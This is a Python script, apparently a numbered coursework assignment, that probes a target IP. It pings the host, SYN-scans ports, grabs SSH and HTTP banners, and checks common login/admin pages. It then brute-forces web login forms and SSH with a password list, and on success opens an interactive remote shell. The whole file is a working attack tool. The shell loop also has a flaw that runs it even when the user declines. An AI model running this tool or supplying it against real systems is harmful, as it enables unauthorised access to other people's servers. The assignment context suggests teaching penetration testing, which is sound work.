# Imports
import argparse
import os
import sys
from scapy.all import ICMP, IP, sr1, TCP
import socket
import requests
import time
from paramiko import SSHClient, AuthenticationException, AutoAddPolicy, SSHException

# Question 2: Connectivity

def checkConnectivity(target_ip):
    # Creates the packet
    packet = IP(dst=target_ip)/ICMP()

    # Sends the packet and waits for a reply 
    reply = sr1(packet, timeout=5, verbose=0) # verbosity set to 0 to avoid unnecessary output

    if reply:  
        return True # If a reply does come back
    else:
        return False

# Question 3: Port Scan

def getPortServices(port):
    # Dictionary of services
        service = {
            20: "FTP Data",
            21: "FTP Control",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            443: "HTTPS",
            3306: "MySQL",
            8080: "HTTP Proxy"
        }
        return service.get(port,"Unavailable")


def scanPorts(target_ip, target_ports):
   
    print(f"\n[+] Performing Port Scan on {target_ip}...") # F-String to include arg
    print(f"{'Port':<8}{'Status':<12}{'Service'}") # Titles
    print("-" * 50)

    ip_header = IP(dst=target_ip)  

    for port in target_ports:
        # Create the TCP header with the port
        tcp_header = TCP(dport=port, )
        packet = ip_header / tcp_header # Craft packet with both IP and TCP header

        # Send the packet and wait for a response
        response = sr1(packet, timeout=2, verbose=0)

        # Determine the port status based on the response
        service = getPortServices(port)
        
        if response is None:  # No response received
            print(f"{port:<8}{'No Response':<12}{service}")
        
        elif response.haslayer(TCP):  # TCP response received
            tcp_response = response.getlayer(TCP)

            if tcp_response.flags == 0x12:  # SYN-ACK (bitwise mask)
                print(f"{port:<8}{'Open':<12}{service}")

                if port == 22:
                    confirmSSH(target_ip)
                elif port == 80:
                    confirmHTTP(target_ip)

            elif tcp_response.flags == 0x14:  # RST-ACK (bitwise mask)
                print(f"{port:<8}{'Closed':<12}{service}")
        
        else:  # Unknown response
            print(f"{port:<8}{'Unknown':<12}{service}")

        


# Question 4: Confirm Service

def confirmSSH(target_ip): # Connect to port 22
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # New socket object for IPv4 TCP communication
        sock.settimeout(5)  # Set timeout to avoid delays if the port is closed
        sock.connect((target_ip, 22))
        banner = sock.recv(1024).decode('utf-8', errors='ignore') # Grab the banner & recieve 1024 bytes of data
        sock.close()
        
        if banner.startswith("SSH-"):
            print(f"SSH service confirmed on {target_ip}:22")
            bruteforceSSH(target_ip, args.username, args.password_list) # Question 7 addition
            print()
            return True
        else:
            print(f"No SSH banner found on {target_ip}:22")
            print()
            return False
   
    except (socket.timeout, socket.error):
        print(f"Unable to connect to {target_ip}:22")
        print()
        return False
    
def confirmHTTP(target_ip):
    try:
        # Send a basic HTTP GET request to port 80
        response = requests.get(f'http://{target_ip}', timeout=5)
        
        # Checking responses (200 is HTTP)
        if response.status_code == 200:
            print(f"HTTP service confirmed on {target_ip}:80")
            print()
            dirBuster(target_ip) # Question 5 addition to call Directory Buster
            return True
        else:
            print(f"Non-200 HTTP response on {target_ip}:80 - Status Code: {response.status_code}")
            print()
            return False
    
    except requests.RequestException:
        print(f"Unable to connect to {target_ip}:80")
        print()
        return False    
    


    
# Question 5: Directory Busting

def dirBuster(target_ip):
    print("\n[-] Starting directory busting for open port 80...")
    print("-" * 50)
   
    # Define the pages to be checked
    pages = [
        "login.php",
        "admin.php",
        "admin/login.php",
        "admin/admin.php",
    ] 

    # Iterates through these pages
    for page in pages:
        url = f"http://{target_ip}/{page}" # Creates URL using target IP and checks with each page
        
        try:
            response = requests.get(url, timeout=5) # Using HTTP requests to find URLs
            
            if response.status_code == 200: # Successful status code
                print(f"[+] Accessible Form: {url}")
                if "<form" in response.text.lower(): # Checks if form is present
                    print(f"    [+] HTML form found on: {url}")
                    bruteforceWeb(url, args.username, args.password_list) # Question 6 addition
                    print()
                else:
                    print(f"    [-] No HTML form found on: {url}")
                    
            else:
                print(f"[-] No accessible form: {url} (Status Code: {response.status_code})")
        except requests.RequestException as e:
            print(f"[-] Error accessing {url}: {e}")
    print()



# Question 6: Bruteforce Web

def bruteforceWeb(url, username, password_list_file):
  
    try:
        # Checks if URL can be accessed
        response = requests.get(url, timeout=5) # GET request
        
        if response.status_code != 200: # Not a HTTP ok status response
            print(f"[-] Unable to access: {url}. Status Code: {response.status_code}")
            return 
        
        html_content = response.text
        form_fields = {}

        # Look for all input fields in the HTML content
        for line in html_content.splitlines():
            line = line.strip().lower() 
            
            # Look for input fields with "name=" to find field values
            if "name='" in line:
                start_index = line.find("name='") + len("name='")
                end_index = line.find("'", start_index)
                
                if start_index != -1 and end_index != -1:
                    field_name = line[start_index:end_index]
                    
                    # Check if the field is related to username or password
                    if 'username' in field_name or 'user' in field_name or 'email' in field_name:
                        form_fields['username'] = field_name
                    elif 'password' in field_name or 'pass' in field_name:
                        form_fields['password'] = field_name


        print(f"[+] Found form fields: {form_fields}")       

        # Ensure both username and password fields were found
        if 'username' not in form_fields or 'password' not in form_fields:
            print("[-] Could not find both 'username' and 'password' fields.")
            return

        
        # Check if the password list file exists
        if not os.path.isfile(password_list_file):
            print(f"[-] Password list file not found: {password_list_file}")
            return
        
        with open(password_list_file, "r", encoding='utf-8', errors='ignore') as file: # Encoding line added
            passwords = file.read().splitlines()  # Read passwords from the file
        
        print("\n[+] Starting brute-force attack...")
        
        # Iterates through the password list and attempts login with each password
        for password in passwords:
            data = {form_fields['username']: username, form_fields['password']: password}  # Prepares the POST data
            
            try:
                # Send POST request with the current username/password combo
                response = requests.post(url, data=data, timeout=5)
                               
                if "Welcome" in response.text: 
                        print(f"[+] Login successful with username: '{username}' and password: '{password}'")
                        return
                else:
                        print(f"[-] Failed login with password: '{password}'") 

            except requests.RequestException as e:
                print(f"[-] Error during request: {e}") # Error Handling
        
        print("[-] Brute force attack completed. No valid credentials found.") # Catch no credentials found e
    
    except requests.RequestException as e:
        print(f"[-] Error accessing the web page: {e}") # Error Handling




# Question 7: Bruteforce SSH

def bruteforceSSH(target_ip, username, password_list):
   
    # Check if the password list file exists + read from
    if not os.path.isfile(password_list):
        print(f"[-] Password list file not found: {password_list}")
        return
    try:
        with open(password_list, "r", encoding='utf-8', errors='ignore') as file:
            passwords = file.read().splitlines()
    except Exception as e:
        print(f"[-] Error reading password file: {e}")
        return
    
    print(f"[+] Starting SSH brute-force attack...")
    
    # SSH connection setup
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy()) 
    
    for password in passwords:
        try:           
            # Connect to the SSH server
            client.connect(target_ip, port=22, username=username, password=password, timeout=10) # Timeout high to avoid error
            
            # Authentication success
            print(f"[+] Success! Username: {username}, Password: {password}")

            # Question 8 : Set-up Shell

            user_input = input(f"[?] Drop to a shell on target {target_ip}? (y/n): ").strip().lower()
            
            if user_input == "y":
                print("[+] Entering interactive shell. Type 'exit' to quit.")
                shell = client.invoke_shell() # Calls the SSH shell

            while True:
                    command = input("$ ")  # Prompt for inputs
                    if command.strip().lower() == "exit":
                        print("[+] Exiting shell...")
                        break
                    else:
                        # Execute command and print the output
                        shell.send(command + "\n")
                        time.sleep(1)  

                        if shell.recv_ready(): # Check if data has been sent from SSH server
                            output = shell.recv(4096).decode('utf-8', errors='ignore') # Outputs this data
                            print(output)

            return 
        
        except AuthenticationException:
            # Authentication failed
            print(f"[-] Authentication failed for password: {password}")
        
        except SSHException as e:
            # General SSH error
            print(f"[-] SSH error: {e}")
            print("[!] Stopping attack due to SSH error.")
            break  # Stop further attempts
        
        except socket.error as e:
            # Connection error
            print(f"[-] Connection error: {e}")
            return
        
        finally:
            # Close client
            client.close()
        
        # Avoid rate-limiting
        time.sleep(1)
    
    print("[-] Brute force attack completed. No valid credentials found.")

    

# Question 1: Argparse
def main():
    print("Credential Checker:") 
    print("-" * 50)       
    
    global args # Allow all methods to access args

    parser = argparse.ArgumentParser(prog="net_attack.py", description="Read User Arguments"
                                     , epilog="Author: Orla Dolan",)

    parser.add_argument(
        "-u", "--username", 
        type=str, 
        required=True, 
        help="Provide username."
    )
    parser.add_argument(
        "-t", "--target", 
        type=str, 
        required=True, 
        help="Specify the target IP address."
    )
    parser.add_argument(
        "-p", "--port", 
        type=str, 
        required=True, 
        help="Specify the target port numbers split with commas (e.g. 22,443,8080)."
    )
    parser.add_argument(
        "-l", "--password-list", 
        type=str, 
        required=True, 
        help="Specify the password list filename."
    )
  
    # Check if arguments are provided
    if len(sys.argv) == 1:
        parser.print_help()  
        sys.exit(1)

    # Parsing the arguments to a variable
    try:
        args = parser.parse_args()  
    except SystemExit: # Catches SystemExit raised by argparse due to missing required values
        parser.print_help()
        sys.exit(1)


    # Task 2 addition: Connectivity Check
    print("\n[+] Checking connectivity to the target IP...")
    print("-" * 50)
    if not checkConnectivity(args.target): # if false
        print(f"Error: Target {args.target} is unreachable.")
        sys.exit(1)
    else:
        print(f"Success: Target {args.target} is reachable.")    


    # Task 3 addition: Scan Ports
    try:
        target_ports = [int(port.strip()) for port in args.port.split(",")]
    except ValueError:
        print("Error: Invalid port list format. Use comma-separated integers (e.g., 22,443,8080).")
        sys.exit(1)

    scanPorts(args.target, target_ports)

    # Display parsed arguments on console
    print("\n[+] Arguments Summary:")
    print("-" * 50)
    print(f"Target IP Address: {args.target}") # F-String to include variable in string
    print(f"Ports to Scan: {', '.join(map(str, target_ports))}") # Allows for multiple ports
    print(f"Username: {args.username}")
    print(f"Password List File: {args.password_list}")

if __name__ == "__main__":
    main()
        
